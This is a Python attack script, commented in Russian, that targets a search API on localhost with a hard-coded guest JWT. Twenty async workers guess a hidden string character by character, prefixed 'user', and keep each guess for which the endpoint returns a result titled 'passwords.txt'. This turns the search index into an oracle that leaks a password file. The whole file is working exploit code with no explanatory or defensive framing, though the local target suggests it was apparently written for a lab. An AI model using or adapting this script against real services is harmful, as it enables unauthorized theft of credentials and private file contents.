import asyncio
import json
import string
import urllib.parse
import urllib.request

BASE_URL = "http://127.0.0.1:8000/search"
HEADERS = {
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6Imd1ZXN0In0.AB31UssqwhYNyN2NrHHPWPXKpDdmHb6dYHKmPNBa4dY"}
TARGET_FILE = "passwords.txt"

charset = string.ascii_letters + string.digits + string.punctuation + " "


def fetch(query):
    # Синхронный запрос на стандартном urllib.
    # httpx через проброс-порт Colima (ssh-туннель) отдаёт 502, а urllib/curl работают.
    url = f"{BASE_URL}?{urllib.parse.urlencode({'query': query})}"
    req = urllib.request.Request(url, headers=HEADERS)
    with urllib.request.urlopen(req, timeout=5) as resp:
        return resp.status, json.loads(resp.read().decode())


async def worker(queue, found):
    while True:
        current_query = await queue.get()
        try:
            status, results = await asyncio.to_thread(fetch, current_query)

            if status == 200:
                if any(item['title'] == TARGET_FILE for item in results):
                    # Если найдено совпадение - сохраняем и ищем дальше
                    found.append(current_query)
                    print(f"[FOUND] {current_query}")

                    # Генерируем новые запросы на основе найденного
                    for char in charset:
                        new_query = f"{current_query}{char}"
                        if len(new_query) <= 50:  # Ограничение глубины поиска
                            await queue.put(new_query)
        except Exception as e:
            print(f"Error: {e}")
        finally:
            queue.task_done()


async def main():
    queue = asyncio.Queue()
    found = []

    # Инициализация первым уровнем символов
    for char in charset:
        await queue.put(f"user{char}")

    # Запуск 20 воркеров
    tasks = [asyncio.create_task(worker(queue, found)) for _ in range(20)]

    await queue.join()

    # Отмена задач после завершения
    for task in tasks:
        task.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)

    print("Найденные совпадения:")
    if found:
        print(max(found, key=len))
    else:
        print("(ничего не найдено — проверьте BASE_URL, токен и TARGET_FILE)")


asyncio.run(main())
